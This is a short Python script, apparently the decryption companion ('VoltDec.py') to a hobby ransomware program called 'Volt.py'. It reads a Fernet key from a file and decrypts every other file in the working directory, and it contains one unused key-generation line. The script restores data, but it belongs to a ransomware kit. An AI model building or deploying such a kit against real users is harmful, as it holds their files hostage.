import os
from cryptography.fernet import Fernet

files = []

#Exclusion Path for the RansomWare / Decrypt
for file in os.listdir():
            if file == "Volt.py" or file == "NewKey.key" or file == "VoltDec.py":
                continue
            if os.path.isfile(file):
                files.append(file)
print(files)

#Reads Ransome Key
key = Fernet.generate_key()
with open("NewKey.key", "rb") as NewKey:
    secretkey = NewKey.read()

#Decrypts The Files and Overwrites with Decrypted Data
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    conts_decrypted= Fernet(secretkey).decrypt(contents)
    with open(file,"wb") as thefile:
            thefile.write(conts_decrypted)